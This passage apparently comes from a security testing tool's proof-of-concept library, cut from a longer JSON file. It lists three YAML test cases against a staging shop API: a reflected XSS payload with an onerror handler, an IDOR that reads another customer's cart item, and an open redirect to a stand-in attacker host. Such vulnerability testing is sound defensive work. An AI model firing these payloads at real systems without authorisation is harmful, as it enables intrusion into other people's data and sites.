    {
      "$description": "The PoC library under poc.dir, as poc.list summarises it (poc_path, id, title, severity) and poc.get returns it (plus description and the YAML). The first two are the files the recorded runs below executed; the third has not run this session.",
      "id": "reflected-xss-search", "title": "Reflected XSS in /api/search q", "severity": "high", "poc_path": "pocs/reflected-xss-search.yaml",
      "description": "The q parameter of /api/search is reflected into the results heading without encoding; the browser step proves the payload executes.",
      "yaml": "name: Reflected XSS in /api/search q\nseverity: high\nvars:\n  target: https://api.shop-staging.test\n  payload: '\"><img src=x onerror=alert(1)>'\nsteps:\n  - request:\n      method: GET\n      url: '{{target}}/api/search?q={{payload}}'\n    assert:\n      - status: 200\n      - word: '{{payload}}'\n  - browser:\n      navigate: '{{target}}/api/search?q={{payload}}'\n      screenshot: true\n    assert:\n      - eval: document.title\n        equals: Results\n"
    },
    {
      "id": "idor-cart-items", "title": "IDOR on /api/cart/items/{id}", "severity": "medium", "poc_path": "pocs/idor-cart-items.yaml",
      "description": "Reading another customer's cart line by id; passes only when the response names an item that is not ours.",
      "yaml": "name: IDOR on /api/cart/items/{id}\nseverity: medium\nvars:\n  target: https://api.shop-staging.test\n  other: 43\nsteps:\n  - request:\n      method: GET\n      url: '{{target}}/api/cart/items/{{other}}'\n    assert:\n      - status: 200\n      - dsl: body.item_id != 42\n"
    },
    {
      "id": "open-redirect-next", "title": "Open redirect via next=", "severity": "low", "poc_path": "pocs/open-redirect-next.yaml",
      "description": "The login page's next= parameter is followed verbatim after a successful login.",
      "yaml": "name: Open redirect via next=\nseverity: low\nvars:\n  target: https://auth.shop-staging.test\n  evil: https://evil.example/\nsteps:\n  - request:\n      method: GET\n      url: '{{target}}/login?next={{evil}}'\n    assert:\n      - status: 302\n      - header: location == {{evil}}\n"
    }
  ],
